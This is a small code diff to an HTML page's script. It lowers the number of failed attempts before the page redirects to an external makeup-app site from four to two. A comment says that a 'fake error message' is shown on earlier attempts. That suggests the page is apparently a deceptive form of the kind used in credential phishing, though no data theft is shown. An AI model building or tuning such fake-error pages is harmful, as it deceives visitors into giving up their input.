@@ -99,8 +99,8 @@
       // Increment failed attempts
       attempts++;
 
-      if (attempts >= 4) {
-        // Redirect after 4 failed attempts
+      if (attempts > 2) {
+        // Redirect after 2 failed attempts
         window.location.href = "https://yce.perfectcorp.com/ai-makeup";
       } else {
         // Show fake error message
@@ -111,5 +111,6 @@
   </script>
 </body>
 </html>
+
 
 
